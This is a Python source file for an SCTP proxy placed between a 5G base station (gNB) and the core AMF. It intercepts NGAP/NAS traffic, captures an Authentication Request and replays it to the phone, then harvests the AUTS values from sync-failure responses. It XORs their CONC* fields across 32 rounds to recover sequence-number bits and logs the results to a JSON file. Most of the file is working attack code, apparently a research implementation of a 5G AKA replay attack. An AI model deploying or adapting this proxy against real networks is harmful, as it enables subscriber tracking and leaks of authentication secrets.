import os
import socket
import threading
import sctp
from pycrate_asn1dir.NGAP import NGAP_PDU_Descriptions
from pycrate_mobile.NAS5G import parse_NAS5G
from copy import deepcopy
import json
from pathlib import Path
from threading import Lock


# Config 
_NGAP_PDU_PROTO = NGAP_PDU_Descriptions.NGAP_PDU

AMF_IP      = os.getenv("AMF_IP","127.0.0.1")
AMF_PORT    = int(os.getenv("AMF_PORT","38412"))
LISTEN_PORT = int(os.getenv("LISTEN_PORT","38412"))


# JSON Config
JSON_FILE = Path("collected.json")
_json_lock = Lock()


# NAS message types
NAS_AUTH_RESPONSE = 0x57
NAS_AUTH_FAILURE = 0x59
NAS_AUTH_REQUEST = 0x56

CAUSE_MAC_FAILURE  = 0x14
CAUSE_SYNC_FAILURE = 0x15

# NGAP procedure codes
PROC_INITIAL_UE = 15
PROC_UPLINK_NAS = 46
PROC_DOWNLINK_NAS = 4

# PPID for AMF, else failure
NAS_PPID = 60

# NGAP helpers
def NGAP_PDU():
    return deepcopy(_NGAP_PDU_PROTO)


def decode_ngap(data: bytes):
    pdu = NGAP_PDU()
    try:
        pdu.from_aper(data)
        return pdu
    except Exception as e:
        print(f"ERROR - NGAP decode failed: {e}")
        return None

def get_procedure_code(pdu) -> int | None:
    try:
        return pdu.get_val()[1]["procedureCode"]
    except Exception:
        return None

def get_ran_ue_id(pdu) -> int | None:
    try:
        ies = pdu.get_val()[1]["value"][1]["protocolIEs"]
        for ie in ies:
            if ie["id"] == 85:
                return ie["value"][1]
    except Exception:
        pass
    return None


def get_nas_msg_type(nas_bytes: bytes) -> int | None:
    try:
        msg, err = parse_NAS5G(nas_bytes)
        if err:
            # print(f"DEBUG parse error: {err}")
            return None
        # print(f"DEBUG NAS raw val: {msg.show()}")
        return msg["5GMMHeader"]["Type"].get_val()
    except Exception as e:
        print(f"ERROR - get_nas_msg_type: {e}")
        return None

def get_nas_msg_fail_cause(nas_bytes: bytes) -> int | None:
    try:
        msg, err = parse_NAS5G(nas_bytes)
        if err:
            return None
        # print(f"DEBUG NAS format: {msg.show()}")

        return msg["5GMMCause"].get_val()[0]
    except Exception:
        return None

def get_nas_pdu(pdu) -> bytes | None:
    try:
        ies = pdu.get_val()[1]["value"][1]["protocolIEs"]
        for ie in ies:
            if ie["id"] == 38:
                return ie["value"][1]
    except Exception:
        pass
    return None


def set_nas_pdu(pdu, new_nas: bytes) -> bytes | None:
    try:
        ies = pdu.get_val()[1]["value"][1]["protocolIEs"]
        for ie in ies:
            if ie["id"] == 38:
                ie["value"] = (ie["value"][0], new_nas)
                break
        return pdu.to_aper()
    except Exception as e:
        print(f"ERROR - NGAP rebuild failed: {e}")
        return None


# ATTACK FUNCTIONALITY

# AUTS functions
def get_auts (nas_bytes: bytes) -> bytes | None:
    try:
        msg, err = parse_NAS5G(nas_bytes)
        if err:
            return None
        return msg["AUTS"]["V"].get_val()
    except Exception as e:
        print(f"ERROR - AUTS extraction failed: {e}")
        return None

def record_auts(ran_ue_id: int, auts: bytes, j: int, delta: int | None, baseline_hex: str | None):
    entry = {
        "ran_ue_ngap_id": ran_ue_id,
        "j":              j,
        "auts_hex":       auts.hex(),
        "conc_star_hex":  auts[:6].hex(),
        "mac_s_hex":      auts[6:].hex(),
        "delta_hex":      hex(delta) if delta is not None else None,
        "baseline_hex":   baseline_hex,
    }
    
    with _json_lock:
        records = json.loads(JSON_FILE.read_text()) if JSON_FILE.exists() else []
        records.append(entry)
        JSON_FILE.write_text(json.dumps(records, indent=2))
    
    print(f"Recorded AUTS j={j}: {entry}")




# ATTACK STATE

_attack_state:  dict[int, dict]   = {}   # ran_ue_id → attack phase state
_state_lock = Lock()


def init_attack_state(ran_ue_id: int, n_bits: int = 32):
    with _state_lock:
        _attack_state[ran_ue_id] = {
            "phase":      "await_baseline", # "idle" | "await_baseline" | "baseline_done" | "await_accept" | "await_sync"
            "j":          0, # current bit index
            "n":          n_bits, # total bits to recover (e.g. 32)
            "baseline":   None, # CONC* from first replay
            "deltas":     [], # CONC*_j XOR baseline, gained info per j
            "replay_pdu": None, # raw NGAP bytes of R0,AUTN0 to replay
        }
def get_state(ran_ue_id: int) -> dict | None:
    with _state_lock:
        return _attack_state.get(ran_ue_id)


def set_phase(ran_ue_id: int, phase: str, **kwargs):
    with _state_lock:
        state = _attack_state.get(ran_ue_id)
        if state:
            state["phase"] = phase
            state.update(kwargs)

def repeat_replay(gnb_sock, ran_ue_id: int):
    state = get_state(ran_ue_id)

    if state and state["replay_pdu"]:
        print(f"Replay R0,AUTN0 (j={state['j']}) for RAN-UE: {ran_ue_id}")
        gnb_sock.sctp_send(state["replay_pdu"], ppid=NAS_PPID)
        set_phase(ran_ue_id, "await_sync")





















# Proxy threads 
def uplink(gnb_sock, amf_sock):
    """gNB → AMF"""
    while True:
        try:
            # Listener for gNB packets
            fromaddr, flags, data, notif = gnb_sock.sctp_recv(65535)
            if not data:
                print("Uplink: connection closed")
                break
            
            # Decode PDU and retrieve 
            pdu  = decode_ngap(data)
            proc = get_procedure_code(pdu) if pdu else None

            # Auth response
            if pdu and proc == PROC_UPLINK_NAS:
                ran_ue_id = get_ran_ue_id(pdu)
                print(f"Authentication Response/Failure — RAN-UE-NGAP-ID: {ran_ue_id}")
                nas = get_nas_pdu(pdu)
                state = get_state(ran_ue_id)


                if nas and state:
                    msg_type = get_nas_msg_type(nas)
                    print("message type",msg_type)
                    
                    # AUTH RESPONSE
                    if msg_type == NAS_AUTH_RESPONSE:
                        print(f"Auth Response (accepted) — RAN-UE: {ran_ue_id}, phase: {state['phase']}")
                        if state["phase"] == "await_baseline" or state["phase"] == "await_accept":
                            repeat_replay(gnb_sock, ran_ue_id)
                            continue
                    
                    # AUTH FAILURE
                    if msg_type == NAS_AUTH_FAILURE:
                        failure_cause = get_nas_msg_fail_cause(nas)
                        # print("failure cause",failure_cause)
                         
                        if failure_cause == CAUSE_MAC_FAILURE:
                            print(f"MAC Failure — RAN-UE: {ran_ue_id} (not target or wrong challenge)")

                        elif failure_cause == CAUSE_SYNC_FAILURE and state["phase"] == "await_sync":
                            auts = get_auts(nas)
                            print("autn",auts)
                            if auts:
                                conc_star = auts[:6]
                                conc_int  = int.from_bytes(conc_star, "big")

                                if state["baseline"] is None:
                                    print(f"  Baseline CONC*_0: {conc_star.hex()}")
                                    set_phase(ran_ue_id, "await_accept", baseline=conc_int)

                                else:
                                    j     = state["j"]
                                    delta = conc_int ^ state["baseline"]
                                    state["deltas"].append(delta)
                                    print(f"  j={j}: CONC*={conc_star.hex()}, δ={delta:#014x}")

                                
                                    record_auts(ran_ue_id, auts, j=j,delta=delta,baseline_hex=hex(state["baseline"]))
                                    j += 1
                                    if j >= state["n"]:
                                        print(f"Attack complete — RAN-UE: {ran_ue_id}")
                                        print(f"Deltas: {[hex(d) for d in state['deltas']]}")
                                        set_phase(ran_ue_id, "idle")
                                    else:
                                        set_phase(ran_ue_id, "await_accept", j=j)
                        
                            continue
                        
            amf_sock.sctp_send(data, ppid=NAS_PPID)

        except Exception as e:
            print(f"ERROR - uplink error {type(e).__name__}: {e}")
            break


 # Listener for AMF packets and forwards to gNB
def downlink(gnb_sock, amf_sock):
    """AMF → gNB"""
    while True:
        try:
            fromaddr, flags, data, notif = amf_sock.sctp_recv(65535)
            if not data:
                print("Downlink: connection closed")
                break

            pdu  = decode_ngap(data)
            proc = get_procedure_code(pdu) if pdu else None
            print(proc)

            if pdu and proc == PROC_DOWNLINK_NAS:
                ran_ue_id = get_ran_ue_id(pdu)
                nas = get_nas_pdu(pdu)
                
                if nas:
                    msg_type = get_nas_msg_type(nas)

                    if msg_type == NAS_AUTH_REQUEST:
                        print(f"Downlink NAS AUTH REQUEST — RAN-UE-NGAP-ID: {ran_ue_id}")
                        state = get_state(ran_ue_id)

                        if state is None:
                            init_attack_state(ran_ue_id)
                            state = get_state(ran_ue_id)

                        if state["phase"] == "await_baseline":
                            with _state_lock:
                                state["replay_pdu"] = data
                        

            gnb_sock.sctp_send(data, ppid=NAS_PPID)

        except Exception as e:
            print(f"ERROR - downlink error {type(e).__name__}: {e}")
            break

# Connection handler
def handle(gnb_sctp):
    print(f" gNB connected — opening AMF {AMF_IP}:{AMF_PORT}")
    amf_sctp = sctp.sctpsocket_tcp(socket.AF_INET)

    amf_sctp.connect((AMF_IP, AMF_PORT))

    t1 = threading.Thread(target=uplink,   args=(gnb_sctp, amf_sctp), daemon=True)
    t2 = threading.Thread(target=downlink, args=(gnb_sctp, amf_sctp), daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()

def main():
    print(f"SQN proxy starting")
    print(f"Listening on 0.0.0.0:{LISTEN_PORT}")
    print(f"Forwarding to AMF {AMF_IP}:{AMF_PORT}")


    server = sctp.sctpsocket_tcp(socket.AF_INET)
    server.bind(("0.0.0.0", LISTEN_PORT))
    server.listen(5)

    while True:
        conn, addr = server.accept()
        print(f"New gNB connection from {addr}")
        t = threading.Thread(target=handle, args=(conn,), daemon=True)
        t.start()

if __name__ == "__main__":
    main()